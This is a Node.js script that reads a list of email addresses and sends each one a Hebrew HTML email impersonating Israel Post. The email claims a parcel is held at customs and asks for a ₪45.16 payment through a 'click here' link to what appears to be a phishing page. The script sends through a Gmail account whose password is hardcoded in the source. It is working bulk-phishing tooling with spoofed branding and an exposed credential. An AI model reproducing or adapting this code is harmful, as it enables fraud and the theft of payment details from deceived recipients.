var nodemailer = require('nodemailer');
const fs = require('fs');

// read the file containing the email addresses
module.exports = async () => {
    try {
        fs.readFile('utils/email-addresses.txt', 'utf8', (err, data) => {
            if (err) throw err


// split the data string into an array of email addresses
            const emailAddresses = data.split('\n');

            var transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: 'pay.israel.post@gmail.com',
                    pass: 'dzvtyfupvlxlnrzn'
                }
            });

            // iterate over the email addresses and send an email to each one
            emailAddresses.forEach((emailAddress) => {
                transporter.sendMail({
                    from: '"דואר ישראל" <nokonok@gmail.com>', // sender address
                    to: emailAddress, // list of receivers
                    subject: "הודעה על דבר דואר  ", // Subject line
                    text: "הודעה על דבר דואר ", // plain text body
                    html: `<table border="0" cellpadding="0" cellspacing="0">
                    <tbody>
                       <tr>
                          <td><a href="https://imgbb.com/"><img alt="israel-Post" src="https://i.ibb.co/MDdByTx/israel-Post.png" /></a>
                          <table border="0" cellpadding="6" cellspacing="6" dir="rtl" style="height:384px">
                             <tbody>
                                <tr>
                                   <td colspan="2" style="height:10px; width:370.797px">דואר ישראל</td>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:36px; width:370.797px">תאריך: 03/08/2022</td>
                                </tr>
                                <tr>
                                   <th colspan="2" style="height:36px; width:370.797px">תשלום מכס לדואר ישראל</th>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:18px; width:370.797px">לקוח יקר,</td>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:18px; width:370.797px">דבר דואר UZ0006691076Y</td>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:18px; width:370.797px">שנשלח מחו&quot;ל מעוקב במכס.</td>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:18px; width:370.797px">עליך לשלם ₪45.16 על מנת לשחררו.</td>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:18px; width:370.797px">לתשלום:<a href="http://localhost:8080/#/il-post" target="\&quot;_blank\&quot;">&nbsp;לחץ כאן</a></td>
                                </tr>
                                <tr>
                                   <td colspan="2" style="height:18px; width:370.797px">לעמידה בהוראות צו ייבוא אישי<a href="\" target="\&quot;_blank\&quot;">&nbsp;לחץ כאן</a></td>
                                </tr>
                                <tr>
                                   <td style="height:36px; width:200px">&nbsp;</td>
                                   <td style="height:36px; width:150.797px">בכבוד רב,<br />
                                   דואר ישראל</td>
                                </tr>
                             </tbody>
                          </table>
                          </td>
                       </tr>
                    </tbody>
                 </table>                 
                 `
                })
            })
        });
    }
    catch(e) {
        console.log("done");
    }
}
